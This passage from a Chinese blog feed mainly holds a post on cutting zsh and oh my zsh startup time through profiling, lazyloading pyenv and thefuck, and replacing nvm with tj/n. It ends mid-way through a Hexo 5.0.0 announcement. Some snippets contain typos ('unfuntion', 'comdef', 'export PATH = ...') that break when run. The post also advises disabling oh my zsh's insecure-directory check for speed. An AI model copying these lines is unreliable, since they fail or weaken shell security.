</div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 